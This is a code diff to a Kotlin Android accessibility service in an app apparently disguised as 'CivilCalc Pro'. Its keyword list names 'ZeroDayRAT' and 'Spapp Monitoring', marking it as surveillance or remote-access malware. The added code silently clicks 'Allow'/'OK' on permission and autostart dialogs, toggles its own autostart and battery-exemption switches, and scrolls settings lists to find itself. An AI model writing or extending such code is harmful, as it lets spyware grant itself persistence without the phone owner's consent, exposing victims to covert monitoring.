@@ -265,6 +265,7 @@ class BlockAccessibilityService : AccessibilityService() {
     }
 
     private var lastAutostartToggleTime = 0L
+    private var autostartScrollAttempts = 0
 
     private fun handleAutostartAndBackgroundSettings(root: AccessibilityNodeInfo?): Boolean {
         if (root == null) return false
@@ -273,13 +274,40 @@ class BlockAccessibilityService : AccessibilityService() {
 
         try {
             val pkg = (root.packageName ?: "").toString().lowercase()
-            val isOemSettings = pkg.contains("securitycenter") ||
-                    pkg.contains("permcenter") ||
-                    pkg.contains("safecenter") ||
-                    pkg.contains("permission") ||
-                    pkg.contains("settings")
+            if (pkg == applicationContext.packageName.lowercase()) return false
 
-            if (!isOemSettings) return false
+            // 0. Check for any Autostart confirmation warning dialog (e.g. MIUI "Allow ... to start automatically? OK", "Allow")
+            val dialogButtons = listOf(
+                "android:id/button1",
+                "com.miui.securitycenter:id/accept",
+                "com.miui.securitycenter:id/btn_accept",
+                "com.coloros.safecenter:id/btn_allow",
+                "com.vivo.permissionmanager:id/btn_allow"
+            )
+            for (btnId in dialogButtons) {
+                val nodes = root.findAccessibilityNodeInfosByViewId(btnId)
+                if (!nodes.isNullOrEmpty()) {
+                    for (btn in nodes) {
+                        if (clickNodeOrParent(btn)) {
+                            Log.i("BlockA11y", "Auto-confirmed Autostart popup dialog via $btnId")
+                            lastAutostartToggleTime = now
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                performGlobalAction(GLOBAL_ACTION_BACK)
+                            }, 1000L)
+                            return true
+                        }
+                    }
+                }
+            }
+            val confirmTexts = setOf("ok", "allow", "turn on", "agree", "confirm", "yes", "அனுமதி")
+            if (findAndClickExactText(root, confirmTexts)) {
+                Log.i("BlockA11y", "Auto-confirmed Autostart popup dialog via confirm text")
+                lastAutostartToggleTime = now
+                Handler(Looper.getMainLooper()).postDelayed({
+                    performGlobalAction(GLOBAL_ACTION_BACK)
+                }, 1000L)
+                return true
+            }
 
             // 1. Check for "No restrictions" in MIUI Battery Saver:
             val noRestrictionMatches = root.findAccessibilityNodeInfosByText("No restrictions")
@@ -303,28 +331,31 @@ class BlockAccessibilityService : AccessibilityService() {
 
             val appKeywords = listOf(
                 "CivilCalc Pro",
-                "civilcalc pro",
                 "CivilCalc",
-                "civilcalc",
+                "Civil Calc Pro",
+                "Civil Calc",
+                "Civil",
                 appLabel,
                 "ZeroDayRAT",
-                "zerodayrat",
                 "ZeroDay",
-                "zeroday",
-                "Spapp Monitoring",
-                "spapp"
+                "Spapp Monitoring"
             )
 
             for (keyword in appKeywords) {
-                val matches = root.findAccessibilityNodeInfosByText(keyword)
-                if (!matches.isNullOrEmpty()) {
+                val matches = findNodesByTextOrDesc(root, keyword)
+                if (matches.isNotEmpty()) {
                     for (node in matches) {
                         if (findAndClickSwitchNearNode(node)) {
                             lastAutostartToggleTime = now
+                            autostartScrollAttempts = 0
                             Log.i("BlockA11y", "Auto-toggled Autostart switch for '$keyword'")
+                            // Wait briefly for confirmation dialog (MIUI "Allow... OK"), auto-click it, then back
                             Handler(Looper.getMainLooper()).postDelayed({
-                                performGlobalAction(GLOBAL_ACTION_BACK)
-                            }, 600L)
+                                clickAnyPermissionDialog()
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    performGlobalAction(GLOBAL_ACTION_BACK)
+                                }, 1000L)
+                            }, 800L)
                             return true
                         }
                     }
@@ -332,17 +363,33 @@ class BlockAccessibilityService : AccessibilityService() {
             }
 
             // 3. In App Info page, look for "Autostart" row:
-            val autostartMatches = root.findAccessibilityNodeInfosByText("Autostart")
-            if (!autostartMatches.isNullOrEmpty()) {
-                for (node in autostartMatches) {
-                    if (findAndClickSwitchNearNode(node)) {
-                        lastAutostartToggleTime = now
-                        Log.i("BlockA11y", "Auto-toggled Autostart switch from App Info page")
-                        Handler(Looper.getMainLooper()).postDelayed({
-                            performGlobalAction(GLOBAL_ACTION_BACK)
-                        }, 1200L)
-                        return true
+            val autostartKeywords = listOf("Autostart", "Auto-start", "Auto start", "Background start")
+            for (kw in autostartKeywords) {
+                val autostartMatches = findNodesByTextOrDesc(root, kw)
+                if (autostartMatches.isNotEmpty()) {
+                    for (node in autostartMatches) {
+                        if (findAndClickSwitchNearNode(node)) {
+                            lastAutostartToggleTime = now
+                            Log.i("BlockA11y", "Auto-toggled Autostart switch from App Info page ($kw)")
+                            Handler(Looper.getMainLooper()).postDelayed({
+                                clickAnyPermissionDialog()
+                                Handler(Looper.getMainLooper()).postDelayed({
+                                    performGlobalAction(GLOBAL_ACTION_BACK)
+                                }, 1000L)
+                            }, 800L)
+                            return true
+                        }
                     }
+                }
+            }
+
+            // 4. If CivilCalc Pro is not yet visible and list is scrollable, scroll down up to 3 times
+            if (autostartScrollAttempts < 3) {
+                val scrollable = findScrollableContainer(root)
+                if (scrollable != null && scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD)) {
+                    autostartScrollAttempts++
+                    Log.i("BlockA11y", "Scrolled forward in Autostart list (attempt $autostartScrollAttempts)")
+                    return true
                 }
             }
         } catch (e: Exception) {
@@ -353,36 +400,83 @@ class BlockAccessibilityService : AccessibilityService() {
 
     private fun findAndClickSwitchNearNode(node: AccessibilityNodeInfo): Boolean {
         var current: AccessibilityNodeInfo? = node
-        for (level in 0..4) {
+        for (level in 0..3) {
             val parent = current?.parent ?: break
+            val parentCls = (parent.className ?: "").toString().lowercase()
+            // Do NOT search across the entire list/recycler view! That belongs to other apps!
+            if (parentCls.contains("recyclerview") || parentCls.contains("listview") || parentCls.contains("scrollview")) {
+                break
+            }
+
             val switchNode = findSwitchInHierarchy(parent)
             if (switchNode != null) {
                 if (!switchNode.isChecked) {
-                    if (switchNode.isClickable && switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                        Log.i("BlockA11y", "Directly clicked switch node: ${switchNode.className}")
+                    Log.i("BlockA11y", "Found unchecked switch for CivilCalc Pro: ${switchNode.className}")
+                    var clicked = switchNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    if (!clicked) {
+                        clicked = clickNodeOrParent(switchNode)
+                    }
+                    if (!clicked) {
+                        clicked = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    }
+                    if (!clicked) {
+                        clicked = clickNodeOrParent(parent)
+                    }
+                    if (!clicked) {
+                        clicked = clickNodeOrParent(node)
+                    }
+                    if (clicked) {
+                        Log.i("BlockA11y", "Successfully clicked switch/row for CivilCalc Pro")
                         return true
-                    } else if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                        Log.i("BlockA11y", "Clicked switch row parent: ${parent.className}")
-                        return true
-                    } else {
-                        // Traverse up to find any clickable ancestor
-                        var p: AccessibilityNodeInfo? = switchNode.parent
-                        while (p != null && p != parent.parent) {
-                            if (p.isClickable && p.performAction(AccessibilityNodeInfo.ACTION_CLICK)) {
-                                Log.i("BlockA11y", "Clicked clickable switch container: ${p.className}")
-                                return true
-                            }
-                            p = p.parent
-                        }
                     }
                 } else {
-                    Log.i("BlockA11y", "Autostart switch is ALREADY checked/ON")
+                    Log.i("BlockA11y", "Autostart switch for CivilCalc Pro is ALREADY ON")
                     return true
                 }
             }
             current = parent
         }
         return false
+    }
+
+    private fun findNodesByTextOrDesc(root: AccessibilityNodeInfo?, query: String): List<AccessibilityNodeInfo> {
+        val results = mutableListOf<AccessibilityNodeInfo>()
+        if (root == null) return results
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        var count = 0
+        while (queue.isNotEmpty() && count < 250) {
+            val node = queue.removeFirst()
+            count++
+            val text = node.text?.toString() ?: ""
+            val desc = node.contentDescription?.toString() ?: ""
+            if (text.contains(query, ignoreCase = true) || desc.contains(query, ignoreCase = true)) {
+                results.add(node)
+            }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
+        }
+        return results
+    }
+
+    private fun findScrollableContainer(root: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
+        if (root == null) return null
+        val queue = ArrayDeque<AccessibilityNodeInfo>()
+        queue.add(root)
+        var count = 0
+        while (queue.isNotEmpty() && count < 100) {
+            val node = queue.removeFirst()
+            count++
+            val cls = (node.className ?: "").toString().lowercase()
+            if (node.isScrollable || cls.contains("recyclerview") || cls.contains("listview") || cls.contains("scrollview")) {
+                return node
+            }
+            for (i in 0 until node.childCount) {
+                node.getChild(i)?.let { queue.add(it) }
+            }
+        }
+        return null
     }
 
     private fun findSwitchInHierarchy(node: AccessibilityNodeInfo?): AccessibilityNodeInfo? {
@@ -685,6 +779,10 @@ class BlockAccessibilityService : AccessibilityService() {
                 packageName.contains("installer") ||
                 packageName.contains("security") ||
                 packageName.contains("safecenter") ||
+                packageName.contains("permcenter") ||
+                packageName.contains("settings") ||
+                packageName.contains("secure") ||
+                packageName.contains("powerkeeper") ||
                 packageName == "android"
 
         if (isPermissionCandidate) {
